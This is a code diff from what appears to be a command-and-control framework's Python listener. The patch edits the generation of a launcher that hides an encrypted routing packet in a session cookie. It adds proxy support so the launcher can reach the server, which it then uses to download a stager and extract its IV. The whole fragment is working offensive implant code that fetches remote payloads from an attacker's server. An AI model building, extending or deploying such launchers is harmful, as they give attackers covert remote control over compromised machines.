@@ -222,8 +222,11 @@ class Listener:
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 # add the RC4 packet to a cookie
-                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];" % (b64RoutingPacket)
-
+                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
+                launcherBase += "import urllib2\n"
+                launcherBase += "if urllib2.getproxies():\n"
+                launcherBase += "   o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))\n"
+                
                 # download the stager and extract the IV
                 launcherBase += "a=o.open(server+t).read();"
                 launcherBase += "IV=a[0:4];"
